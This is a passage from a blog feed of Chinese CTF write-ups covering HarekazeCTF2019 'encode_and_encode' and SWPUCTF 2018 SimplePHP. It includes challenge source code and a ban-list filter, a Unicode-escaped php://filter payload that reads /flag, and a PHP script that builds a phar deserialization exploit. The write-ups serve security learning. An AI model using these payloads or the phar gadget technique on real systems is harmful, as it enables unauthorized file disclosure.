class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure><p>通过分析代码，在<code>is_valid</code>函数这块过滤了<code>流控制器</code>和<code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里通过<code>post</code>接受<code>json</code>数据然后解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>通过了两个判断</p><ol><li><code>post</code>数据中不能存在黑名单内容，并且有<code>page键</code></li><li>读取的文件内不能有黑名单内容且文件内容不为空</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查阅PHP的<code>json_decode</code>函数，发现Unicode编码后的内容通过<code>json_decode</code>可以被正常解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$body</span> = <span class="string">&#x27;&#123;&quot;page&quot;:&quot;/fl\u0061g&quot;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = json_decode(<span class="variable">$body</span>,<span class="literal">true</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="/post/2021-12/[HarekazeCTF2019]encode_and_encode/image-20211208225403126.png" alt="image-20211208225403126"></p><p>因为是对<code>$body</code>进行过滤，最后<code>file_get_contents</code>的参数是解析过后的内容，然后再通过<code>php://filter/read=conver.base64-encode</code>用来绕过第二个判断和最后的<code>replace</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">&#123;<span class="attr">&quot;page&quot;</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&#125;</span><br><span class="line">unicode encode=&gt;</span><br><span class="line">&#123;<span class="attr">&quot;page&quot;</span>:<span class="string">&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>这里我用HackBar传json数据失败了，这里用的postman，当然用bp也是可以的</p><p><img src="/post/2021-12/[HarekazeCTF2019]encode_and_encode/image-20211208225928494.png" alt="image-20211208225928494"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2018-SimplePHP</title>
      <link href="/post/2021-12/%5BSWPUCTF%202018%5DSimplePHP/"/>
      <url>/post/2021-12/%5BSWPUCTF%202018%5DSimplePHP/</url>
      
        <content type="html"><![CDATA[<h1 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h1><p><strong>考点：1、PHP代码审计    2、Phar反序列化漏洞</strong></p><p>网站中有两个功能：<code>查看文件</code>和<code>上传文件</code>，利用查看文件将源码都先弄下来进行PHP代码审计。</p><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在<code>file_exists</code>函数，并且有<code>class.php</code>和<code>upload_file.php</code>（通过类文件可能可以构造反序列化攻击，通过文件上传phar文件可以触发file_exists），猜测应该是Phar反序列化漏洞</p><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        unlink(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>通过审计<code>function.php</code>，只对后缀进行了白名单过滤，不造成影响，上传路径也是已知的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span></span><br></pre></td></tr></table></figure><p>页面右上角已经输出了<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>，之后就要通过<code>class.php</code>构造链子</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>C1e4r::__destruct =&gt; Show::__toString =&gt; Test::__get =&gt; Test::get =&gt; Test::file_get</p></blockquote><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;<span class="comment">// 一定要是绝对路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> C1e4r(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>上传成功后，直接查看<code>upload</code>目录也可以找到文件，然后通过<code>phar://</code>伪协议读取就可以得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=phar://upload/8efb16f93aff65a6f9b440dbb29a5736.jpg</span><br></pre></td></tr></table></figure><p><strong>再附魔术方法</strong></p><table><thead><tr><th align="center">魔术方法</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">__construct()</td><td align="center">当对象被创建时会调用此方法</td></tr><tr><td align="center">__destrurct()</td><td align="center">在某个对象的所有引用都被删除或者当对象被显式销毁时执行</td></tr><tr><td align="center">__sleep()</td><td align="center">当对象被序列化时会调用此方法</td></tr><tr><td align="center">__wakeup()</td><td align="center">当对象被反序列化时将会调用此方法</td></tr><tr><td align="center">__call()</td><td align="center">在对象中调用一个不可访问方法时，该方法被调用</td></tr><tr><td align="center">__callStatic()</td><td align="center">在静态上下文中调用一个不可访问方法时，该方法被调用</td></tr><tr><td align="center">__get()</td><td align="center">读取不可访问属性的值时，该方法被调用</td></tr><tr><td align="center">__set()</td><td align="center">在给不可访问属性赋值时，该方法被调用</td></tr><tr><td align="center">__toString()</td><td align="center">当一个类被当作字符串时将会调用此方法</td></tr><tr><td align="center">__invoke()</td><td align="center">当尝试以调用函数的方式调用一个对象时该方法会被调用</td></tr><tr><td align="center">__isset()</td><td align="center">当对不可访问属性调用 isset() 或 empty() 时，该方法会被调用</td></tr><tr><td align="center">__unset()</td><td align="center">当对不可访问属性调用 unset() 时，该方法会被调用</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020白虎组 PicDown</title>
      <link href="/post/2021-12/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown/"/>
      <url>/post/2021-12/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown/</url>
      
